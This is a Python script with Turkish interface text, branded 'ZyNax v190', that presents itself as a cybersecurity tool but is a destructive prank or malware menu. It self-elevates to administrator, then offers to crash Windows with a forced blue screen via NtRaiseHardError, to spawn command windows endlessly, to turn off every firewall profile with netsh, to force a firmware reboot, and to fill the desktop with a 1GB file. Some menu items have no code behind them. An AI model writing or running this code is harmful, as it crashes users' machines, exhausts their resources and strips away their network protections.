import os
import sys
import time
import ctypes
import threading
import json
import platform
from urllib.request import urlopen

# --- RENK PALETİ ---
R, G, Y, B, C, W, RES = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[97m", "\033[0m"
os.system("") 

def temizle():
    os.system('cls' if os.name == 'nt' else 'clear')

def admin_olarak_baslat():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return False

def giris_ekrani():
    temizle()
    print(f"{R} [!] SISTEME SIZILIYOR...{RES}")
    loglar = ["[*] Kernel yukleniyor...", "[*] ZyNax v190 baglandi.", "[*] Yusuf yetkisi onaylandi."]
    for log in loglar:
        print(f"{G} {log}{RES}")
        time.sleep(0.3)

    print(f"\n\t\t{R}╔══════════════════════════════════════════════╗")
    print(f"\t\t║          !!! ZYNAX SIBER GUVENLIK !!!        ║")
    print(f"\t\t║               YAPIMCI: YUSUF                 ║")
    print(f"\t\t╚══════════════════════════════════════════════╝{RES}")
    print(f"\n\t\t{Y}⚠️  DIKKAT: TUM SORUMLULUK KULLANICIYA AITTIR.{RES}")
    for i in range(3, 0, -1):
        print(f"\t\t[ ACILMASINA: {i} SANIYE ]", end="\r")
        time.sleep(1)

def sonsuz_pencere():
    print(f"{R}[!!!] SINIRSIZ MOD AKTIF!{RES}")
    while True:
        os.system("start cmd.exe")

def ana_menu():
    temizle()
    # GENIS VE 3D GORUMLU ZYNAX LOGOSU
    print(f"""{R}
 ███████╗██╗   ██╗███╗   ██╗ █████╗ ██╗  ██╗
 ╚══███╔╝╚██╗ ██╔╝████╗  ██║██╔══██╗╚██╗██╔╝
   ███╔╝  ╚████╔╝ ██╔██╗ ██║███████║ ╚███╔╝ 
  ███╔╝    ╚██╔╝  ██║╚██╗██║██╔══██║ ██╔██╗ 
 ███████╗   ██║   ██║ ╚████║██║  ██║██╔╝ ██╗
 ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ v190
    {RES}""")
    
    print(f"\t{R}[!]{G} ZyNax{Y} v190{B} |{C} Yapimci: {W}Yusuf{RES}")
    print(f"{C}—"*65 + f"{RES}")
    print(f" [01] {Y}🔍 IP ANALIZ{RES}          [07] {R}🖼️  SINIRSIZ PENCERE{RES}")
    print(f" [02] {Y}💣 DISK BOMBASI{RES}        [08] {R}🛡️  FIREWALL KAPAT{RES}")
    print(f" [03] {R}💻 MAVI EKRAN{RES}          [09] {R}🔒 SISTEM KILIT{RES}")
    print(f" [04] {R}⚠️  HARD RESET{RES}          [10] {R}🔄 REBOOT DONGUSU{RES}")
    print(f" [05] {B}⚡ RESTART{RES}             [11] {C}🚪 GUVENLI CIKIS{RES}")
    print(f" [06] {C}⚙️  BIOS ZORLA{RES}          {W}-------------------------{RES}")
    print(f"{C}—"*65 + f"{RES}")

    secim = input(f"\n {B}ZyNax_YUSUF > {RES}")

    if secim == "1":
        try:
            d = json.loads(urlopen("http://ip-api.com/json/").read().decode())
            print(f"\n{G}IP: {d.get('query')} | Sehir: {d.get('city')}{RES}")
        except: pass
        input("\nENTER..."); ana_menu()
    elif secim == "2":
        temizle()
        yol = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zynax.dat')
        with open(yol, "wb") as f:
            f.seek(1024*1024*1024 - 1) # 1GB default
            f.write(b"\0")
        print(f"{G}1GB Dosya Masaustune Olusturuldu.{RES}"); input(); ana_menu()
    elif secim == "3":
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    elif secim == "6": os.system("shutdown /r /fw /t 0")
    elif secim == "7": sonsuz_pencere()
    elif secim == "8": os.system("netsh advfirewall set allprofiles state off"); ana_menu()
    elif secim == "11": sys.exit()
    else: ana_menu()

if __name__ == "__main__":
    if admin_olarak_baslat():
        giris_ekrani()
        ana_menu()
    else:
        sys.exit()
